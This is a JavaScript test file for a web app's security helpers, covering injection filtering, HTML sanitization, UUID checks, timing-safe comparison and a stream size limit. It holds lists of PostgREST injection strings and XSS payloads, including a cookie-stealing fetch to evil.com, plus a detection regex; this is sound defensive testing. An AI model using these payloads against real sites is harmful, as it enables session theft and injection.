import test from 'node:test';
import assert from 'node:assert/strict';
import {
  isValidUUID,
  safeEqual,
  isSafeLookupQuery,
} from '../lib/security.ts';
import { escapeHtml, sanitizeCertificateHtml } from '../lib/sanitize.ts';

test('adversarial: PostgREST operator injection bypass attempts', () => {
  const attacks = [
    'student@srmap.edu.in,id.neq.0',
    'lead_email.ilike.%',
    'id.is.null',
    'id.not.is.null',
    'status.in.(confirmed,pending)',
    'form_data->>phone.eq.9999999999',
    'admin@srmap.edu.in) or (id.is.not.null',
    'user@srmap.edu.in::text',
    'test<test>test',
    'test:test',
    'test,test',
    'test(test)',
    'test;select * from users;',
    'AP12345.eq.AP12345',
    'test.cs.{1,2,3}',
    'test.ov.[1,2]',
  ];

  for (const attack of attacks) {
    assert.equal(
      isSafeLookupQuery(attack),
      false,
      `Attacker query bypassed injection filter: ${attack}`
    );
  }
});

test('adversarial: valid lookup queries pass without false positives', () => {
  const legit = [
    'john.doe@srmap.edu.in',
    'ap21110010001',
    'AP21110010001',
    'student_name@srmap.edu.in',
    'user-name@srmap.edu.in',
    'AP 21110010001',
    'REG-2026-9901',
  ];

  for (const query of legit) {
    assert.equal(
      isSafeLookupQuery(query),
      true,
      `Legitimate query was falsely rejected: ${query}`
    );
  }
});

test('adversarial: XSS mutation payloads and URI bypass attempts', () => {
  const attacks = [
    '<script src="https://evil.com/x.js"></script>',
    '<SCRIPT SRC="https://evil.com/x.js"></SCRIPT>',
    '<img src="x" onerror="fetch(\'https://evil.com/\'+document.cookie)">',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">Click here</a>',
    '<a href="  javascript:alert(1)  ">Click here</a>',
    '<a href="vbscript:msgbox(1)">Click</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>',
    '<body onload="alert(1)">',
    '<svg onload="alert(document.domain)">',
    '<button onclick="malicious()">Submit</button>',
    '<input type="text" onfocus="steal()">',
    '<object data="exploit.swf"></object>',
    '<embed src="exploit.pdf">',
  ];

  for (const attack of attacks) {
    const sanitized = sanitizeCertificateHtml(attack);
    assert.equal(
      /<script\b|onerror|onload|onclick|onfocus|<iframe\b|<object\b|<embed\b|<input\b|<button\b|javascript:|vbscript:|data:text\/html/i.test(
        sanitized
      ),
      false,
      `Sanitization failed to strip payload: ${attack} -> ${sanitized}`
    );
  }
});

test('adversarial: HTML entity escape handles non-string and nested characters', () => {
  assert.equal(escapeHtml('<b onmouseover="alert(1)">Test</b>'), '&lt;b onmouseover=&quot;alert(1)&quot;&gt;Test&lt;/b&gt;');
  assert.equal(escapeHtml('"""\'\'\'<<<>>>&&&'), '&quot;&quot;&quot;&#39;&#39;&#39;&lt;&lt;&lt;&gt;&gt;&gt;&amp;&amp;&amp;');
  assert.equal(escapeHtml(0), '0');
  assert.equal(escapeHtml(false), 'false');
  assert.equal(escapeHtml(undefined), '');
});

test('adversarial: Bearer token UUID enforcement rejects path traversal & wildcards', () => {
  const malformed = [
    '../ticket/secret',
    '550e8400-e29b-41d4-a716-446655440000/details',
    '550e8400-e29b-41d4-a716-446655440000%00',
    '550e8400-e29b-41d4-a716-44665544000g', // non-hex
    '550e8400-e29b-41d4-a716-4466554400001', // too long
    '550e8400-e29b-41d4-a716-44665544000', // too short
    '*',
    '%',
    '-- OR 1=1',
  ];

  for (const id of malformed) {
    assert.equal(isValidUUID(id), false, `Malformed ID passed UUID check: ${id}`);
  }

  assert.equal(isValidUUID('deca203b-171a-4df9-98bb-d92df29a4e37'), true);
});

test('adversarial: Timing-safe equality defends against length leak and early return', () => {
  const secret = 'a'.repeat(64);
  assert.equal(safeEqual(secret, secret), true);
  assert.equal(safeEqual(secret, 'b'.repeat(64)), false);
  assert.equal(safeEqual(secret, 'a'.repeat(63)), false);
  assert.equal(safeEqual(secret, 'a'.repeat(65)), false);
  assert.equal(safeEqual('', ''), true);
  assert.equal(safeEqual('', 'a'), false);
});

test('adversarial: Streaming byte-counter aborts oversized chunked stream even without Content-Length', async () => {
  const maxLimit = 1024; // 1KB test limit
  let bytesReceived = 0;
  const limiter = new TransformStream({
    transform(chunk, controller) {
      bytesReceived += chunk.byteLength;
      if (bytesReceived > maxLimit) {
        controller.error(new Error('PAYLOAD_TOO_LARGE'));
        return;
      }
      controller.enqueue(chunk);
    },
  });

  // Create stream yielding chunks beyond maxLimit
  const sourceStream = new ReadableStream({
    start(controller) {
      controller.enqueue(new Uint8Array(512));
      controller.enqueue(new Uint8Array(512));
      controller.enqueue(new Uint8Array(512)); // breaches 1KB limit
      controller.close();
    },
  });

  const limited = sourceStream.pipeThrough(limiter);
  const reader = limited.getReader();

  let caughtError = null;
  try {
    while (true) {
      const { done } = await reader.read();
      if (done) break;
    }
  } catch (err) {
    caughtError = err;
  }

  assert.ok(caughtError !== null, 'Stream should have thrown PAYLOAD_TOO_LARGE');
  assert.equal(caughtError.message, 'PAYLOAD_TOO_LARGE');
  assert.ok(bytesReceived > maxLimit);
});
